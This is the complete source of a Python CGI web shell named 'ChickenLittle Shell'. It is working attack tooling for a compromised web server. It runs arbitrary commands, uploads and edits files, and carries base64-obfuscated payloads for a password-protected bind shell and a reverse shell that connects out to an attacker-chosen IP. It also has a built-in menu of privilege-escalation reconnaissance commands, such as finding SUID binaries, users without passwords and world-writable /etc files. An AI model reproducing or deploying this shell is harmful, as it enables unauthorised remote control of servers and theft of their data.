#!/usr/bin/python
"""
ChickenLittle Shell by Zep
"""

try:
    import cgitb; cgitb.enable()
except:
    pass
import sys, cgi, os, base64, subprocess
from time import strftime
from string import Template

bind_port = """aW1wb3J0IG9zLCBzeXMsIHNvY2tldCwgdGltZQpQT1JUID0gaW50KHN5cy5hcmd2WzFdKQpQVyA9
IHN5cy5hcmd2WzJdCnNvY2sgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5T
T0NLX1NUUkVBTSkKc29jay5iaW5kKCgiMC4wLjAuMCIsUE9SVCkpCnNvY2subGlzdGVuKDUpClNI
RUxMPSIvYmluL2Jhc2ggLWkiCndoaWxlIFRydWU6CiAgICB0cnk6CQogICAgICAgIChjb25uLGFk
ZHIpID0gc29jay5hY2NlcHQoKQogICAgICAgIG9zLmR1cDIoY29ubi5maWxlbm8oKSwwKQogICAg
ICAgIG9zLmR1cDIoY29ubi5maWxlbm8oKSwxKQogICAgICAgIG9zLmR1cDIoY29ubi5maWxlbm8o
KSwyKQogICAgICAgIHByaW50ID4+IHN5cy5zdGRlcnIsICdQYXNzd29yZDogJywKICAgICAgICBw
ID0gY29ubi5yZWN2KDEwMjQpCiAgICAgICAgcCA9IHAuc3RyaXAoKQogICAgICAgIGlmIHAgPT0g
UFc6CiAgICAgICAgICAgIG9zLnN5c3RlbSgiL2Jpbi9iYXNoIC1pIikKICAgICAgICBlbHNlOgog
ICAgICAgICAgICBwcmludCA+PiBzeXMuc3RkZXJyLCAiR28gdG8gaGVsbCIKICAgICAgICBjb25u
LmNsb3NlKCkKICAgIGV4Y2VwdCBFeGNlcHRpb24sZTogIAogICAgICAgIHByaW50IGUKICAgICAg
ICB0aW1lLnNsZWVwKDEpCg=="""

back_connect = """aW1wb3J0IHNvY2tldCwgb3MsIHN5cwpIT1NUID0gc3lzLmFyZ3ZbMV0KUE9SVCA9IGludChzeXMu
YXJndlsyXSkKU0hFTEwgPSAiL2Jpbi9iYXNoIC1pIgpzb2NrID0gc29ja2V0LnNvY2tldChzb2Nr
ZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pCnNvY2suY29ubmVjdCgoSE9TVCxQT1JUKSkK
dHJ5OgogICAgb3MuZHVwMihzb2NrLmZpbGVubygpLCAwKQogICAgb3MuZHVwMihzb2NrLmZpbGVu
bygpLCAxKQogICAgb3MuZHVwMihzb2NrLmZpbGVubygpLCAyKQogICAgb3Muc3lzdGVtKFNIRUxM
KQpleGNlcHQgRXhjZXB0aW9uLGU6CiAgICBwcmludCBlCnNvY2suY2xvc2UoKQo="""

# HTML

html = Template("""
<html>
<head>
    <title>ChickenLittle Shell</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /> 
    <style>
        body {
            color:#fff;
            background-color:#585858;
            font-size:11px;
        }
        table {
            font-family: Verdana, Tahoma;
            font-size:11px;
        }
        tr {
            border: #D9D9D9 1px solid;
        }
        td {
            border: #D9D9D9 1px solid;
        }
        a { 
            color: #fff;
        }
        input {
            background-color:#800000;
            color:#FFFFFF;
            font-family:Tahoma;
            font-size:8pt;
        }
        select {
            background-color:#800000;
            color:#FFFFFF;
            font-family:Tahoma;
            font-size:8pt;
        }
        textarea {
            background-color:#800000;
            color:#FFFFFF;
            font-family:Tahoma;
            font-size:8pt;
        }
    </style>
</head>
<body>
    <script type="text/javascript">
        function toggleEnviron()
        {
            if (document.getElementById('environ_table').style.display=="none")
                document.getElementById('environ_table').style.display="";
            else
                document.getElementById('environ_table').style.display="none";
        }
    </script>
    <center><h2>=== ChickenLittle Shell ===</h2></center>
    <a href="javascript:void(0)" onclick="javascript:toggleEnviron()">Show/Hide Environment variables</a>
    $environ_table
    <p />
    <table width="100%">
        <tr><td>
            uname -a: $uname <br />
            $uid
        </td></tr>
    </table>
    <p />
    <div style="display:$edit_file_box_visibility">
        <b>Edit File:</b> <br />
        <form method="POST" action="?">
            <textarea name="file_content" cols="200" rows="30" >$file_content</textarea>
            <input type="hidden" value="$cur_dir" size="50" name="cur_dir" /> <br />
            <input type="hidden" value="save_file" size="50" name="command" /> <br />
            <input type="hidden" value="$file_name" size="50" name="file_name" /> <br />
            <input type="submit" value="Save">       
        </form>
        <p />
    </div>
    <table width="100%">
        <tr>    
            <td style="text-align:center">
                <b>:: Change Dir ::</b><br />
                <form action="?" method="POST">
                    <input type="text" value="$cur_dir" size="50" name="cur_dir">&nbsp;<input type="submit" value="Go">
                </form>
            </td>
            <td style="text-align:center">
                <b>:: Get File ::</b><br />
                <form action="?" method="POST">
                    <input type="text" value="$cur_dir" size="50" name="cur_dir">&nbsp;<input type="submit" value="Go">
                </form>
            </td>
        </tr>
    </table>
    <p />
    <table width="100%">
        <tr>
            <td colspan="2" style="text-align:center"><b>$cur_dir</b></td>
        </tr>
        <tr>
            <td><pre>$list_files</pre></td>
        </tr>
    </table>
    <p />
    <b>Result of command</b><br />
    <table width="100%">
        <tr>
            <td>
                <textarea cols="200" rows="10">$command_result</textarea>
            </td>
        </tr>
    </table>
    <table width="100%">
        <tr>    
            <td style="text-align:center" width="50%">
                <b>:: Execute Command ::</b><br />
                <form action="?" method="POST">
                    <input type="hidden" value="$cur_dir" size="50" name="cur_dir" />
                    <input type="text" value="" size="50" name="command">&nbsp;<input type="submit" value="Execute">
                </form>
            </td>
            <td style="text-align:center">
                <b>:: Useful Commands ::</b><br />
                <form action="?" method="POST">
                    <select name="command">
                        <option value="uname -a">Kernel version</option>
                        <option value="w">Logged in users</option>
                        <option value="lastlog">Last to connect</option>
                        <option value="find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null">Suid bins</option>
                        <option value="cut -d: -f1,2,3 /etc/passwd | grep ::">USER WITHOUT PASSWORD!</option>
                        <option value="find /etc/ -type f -perm -o+w 2> /dev/null">Write in /etc/?</option>
                        <option value="which wget curl w3m lynx">Downloaders?</option>
                        <option value="cat /proc/version /proc/cpuinfo">CPUINFO</option>
                        <option value="netstat -atup | grep IST">Open ports</option>
                        <option value="locate gcc">gcc installed?</option>
                    </select>
                    <input type="hidden" value="$cur_dir" size="50" name="cur_dir" />
                    <input type="submit" value="Go" />
                </form>
            </td>
        </tr>
    </table>    
    <p />
    <table width="100%">
        <tr>    
            <td style="text-align:center" width="50%">
                <b>:: Create Dir ::</b><br />
                <form action="?" method="POST">
                    <input type="text" value="$cur_dir" size="50" name="new_dir">&nbsp;<input type="submit" value="Create">
                    <input type="hidden" value="mkdir" size="50" name="command" />
                    <input type="hidden" value="$cur_dir" size="50" name="cur_dir">
                </form>
            </td>
            <td style="text-align:center">
                <b>:: Upload File ::</b><br />
                <form action="?" method="POST" enctype="multipart/form-data">
                    <input type="file" name="file">&nbsp;<input type="submit" value="Upload">
                    <input type="hidden" value="upload" size="50" name="command" />
                    <input type="hidden" value="$cur_dir" size="50" name="cur_dir">
                </form>
            </td>
        </tr>
    </table>
    <p />
    <table width="100%">
        <tr>    
            <td style="text-align:center" width="50%">
                <b>:: Search Text in Files ::</b><br />
                <form action="?" method="POST">
                    <table width="100%">
                        <tr>
                            <td width="50%" style="border:none;text-align:right">Text: </td>
                            <td style="border:none"><input type="text" value="" size="30" name="search_text" /></td>
                        </tr>
                        <tr>
                             <td width="50%" style="border:none;text-align:right">Directory: </td>
                            <td style="border:none"><input type="text" value="$cur_dir" size="30" name="search_dir" /></td>
                        </tr>
                        <tr>
                             <td width="50%" style="border:none;text-align:right">Include File Pattern: </td>
                            <td style="border:none"><input type="text" value="" size="30" name="include_pattern" /></td>
                        </tr>
                        <tr>
                             <td width="50%" style="border:none;text-align:right">Exclude File Pattern: </td>
                            <td style="border:none"><input type="text" value="" size="30" name="exclude_pattern" /></td>
                        </tr>
                    </table>
                    <input type="submit" value="Search">
                    <input type="hidden" value="search_text" size="50" name="command" />
                    <input type="hidden" value="$cur_dir" size="50" name="cur_dir">
                </form>
            </td>
            <td style="text-align:center;vertical-align:top">
                <b>:: Edit File ::</b><br />
                <form action="?" method="POST">
                    <input type="hidden" value="$cur_dir" size="50" name="cur_dir" />
                    <input type="hidden" value="edit_file" size="50" name="command">
                    <input type="text" value="$cur_dir" size="50" name="file_name">
                    &nbsp;<input type="submit" value="Edit">
                </form>
            </td>
        </tr>
    </table>
    <p />
    <table width="100%">
        <tr>    
            <td style="text-align:center" width="50%">
                <b>:: Bind port to /bin/bash ::</b><br />
                <form action="?" method="POST">
                    <table width="100%">
                        <tr>
                            <td width="50%" style="border:none;text-align:right">Port: </td>
                            <td style="border:none"><input type="text" value="" size="10" name="port" /></td>
                        </tr>
                        <tr>
                            <td style="border:none;text-align:right">Password: </td>
                            <td style="border:none"><input type="text" value="" size="10" name="password" /></td>
                        </tr>
                    </table>
                    <input type="submit" value="Bind">
                    <input type="hidden" value="bind_port" size="50" name="command" />
                    <input type="hidden" value="$cur_dir" size="50" name="cur_dir">
                </form>
            </td>
            <td style="text-align:center" width="50%">
                <b>:: back-connect ::</b><br />
                <form action="?" method="POST">
                    <table width="100%">
                        <tr>
                            <td width="50%" style="border:none;text-align:right">IP: </td>
                            <td style="border:none"><input type="text" value="" size="10" name="ip" /></td>
                        </tr>
                        <tr>
                            <td style="border:none;text-align:right">Port: </td>
                            <td style="border:none"><input type="text" value="" size="10" name="port" /></td>
                        </tr>
                    </table>
                    <input type="submit" value="Connect">
                    <input type="hidden" value="back_connect" size="50" name="command" />
                    <input type="hidden" value="$cur_dir" size="50" name="cur_dir">
                </form>
            </td>
        </tr>
    </table>
    <p />
    <table width="100%">
        <tr>
            <td style="text-align:center"><b>(.)(.) [ChickenLittle Shell by Zep] (.)(.)</b></td>
        </tr>
    </table>
</body>
</html>
""")

scriptname = ""

if os.environ.has_key("SCRIPT_NAME"):
    scriptname = os.environ["SCRIPT_NAME"]

def get_environ_table():
    s = "<table style=\"display:none\" id=\"environ_table\">"
    for k in os.environ:
        s+="<tr><td>%s</td><td>%s</td></tr>"%(k,os.environ[k])
    s+="</table>"
    return s

def run_command(command):
    p = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, close_fds=True)
    (i,o) = p.stdin,p.stdout
    return o.read()

def get_param(form, param,default=None):
    if form.has_key(param):
        return form.getvalue(param)
    return default

def can_write(file_name):
    try:
        f = open(file_name,"w")
        f.close()
        return True
    except:
        return False

def put_script(base_name,encoded_script):
    script = base64.b64decode(encoded_script)
    i = 0
    file_name = "/tmp/"+base_name + str(i)  
    while not can_write(file_name):
        i+=1
        file_name = "/tmp/"+base_name + str(i)  
    
    f = open(file_name,"w")
    f.write(script)
    f.close()
    return file_name

def main():

    print "Content-type: text/html"         # header
    print                                   # blank line

    form = cgi.FieldStorage()
    uname = run_command("uname -a")
    uid = run_command("id")

    cur_dir = get_param(form, "cur_dir",os.getcwd())

    if not os.path.exists(cur_dir):
        cur_dir = os.getcwd()
    os.chdir(cur_dir)
    command = get_param(form,"command")
    command_result = ""

    file_content = ""
    file_name = ""
    edit_file_box_visibility = "None"

    if command == "mkdir":
        new_dir = get_param(form,"new_dir")
        command_result = run_command("mkdir " + new_dir)	
    elif command == "upload":
        upload_file = form["file"]
        try:
            f  = open(upload_file.filename,"w")
            while True:
                chunk = upload_file.file.read(1024)
                if not chunk: break
                f.write(chunk)
            f.close()
        except Exception,e:
            command_result = str(e)

    elif command == "search_text":
        search_text = get_param(form,"search_text","")
        search_dir = get_param(form,"search_dir",".")
        include_pattern = get_param(form,"include_pattern")
        exclude_pattern = get_param(form,"exclude_pattern")
        cmd = "grep -ir \"%s\" %s " % (search_text,search_dir)
        if include_pattern:
            cmd += "--include=%s " % include_pattern
        if exclude_pattern:
            cmd += "--include=%s " % exclude_pattern
        command_result = run_command(cmd)

    elif command == "edit_file":
        file_name = get_param(form,"file_name")
        try:
            f = open(file_name,"r")
            file_content = f.read()
            f.close()
            edit_file_box_visibility = ""            
        except:
            command_result = "Cannot open file"
            file_content = ""
            edit_file_box_visibility = "None"

    elif command == "save_file":
        file_name = get_param(form,"file_name")
        file_content = get_param(form,"file_content")
        try:
            f = open(file_name,"w")
            f.write(file_content)
            f.close()
            command_result = "Successful"
        except:
            command_result = "Cannot write to file"
                
    elif command == "bind_port":
        port = get_param(form,"port")
        password = get_param(form,"password")
        file_name = put_script("bp",bind_port)
        pid = subprocess.Popen(["python %s %s %s" % (file_name,port,password)],shell=True).pid
        command_result = "Process ID : %d " % pid

    elif command == "back_connect":
        port = get_param(form,"port")
        ip = get_param(form,"ip")
        file_name = put_script("bc",back_connect)
        pid = subprocess.Popen(["python %s %s %s" % (file_name,ip,port)],shell=True).pid
        command_result = "Process ID : %d " % pid

    elif command != None:
        command_result = run_command(command)

    list_files = run_command("ls -alh " + cur_dir)

    print html.substitute(environ_table=get_environ_table(),
                          uname = uname,
                          uid = uid,
                          list_files = list_files,
                          cur_dir = cur_dir,
                          command_result = command_result,
                          file_content = file_content,
                          file_name    = file_name,
                          edit_file_box_visibility = edit_file_box_visibility
                            )

if __name__ == '__main__':
    main()
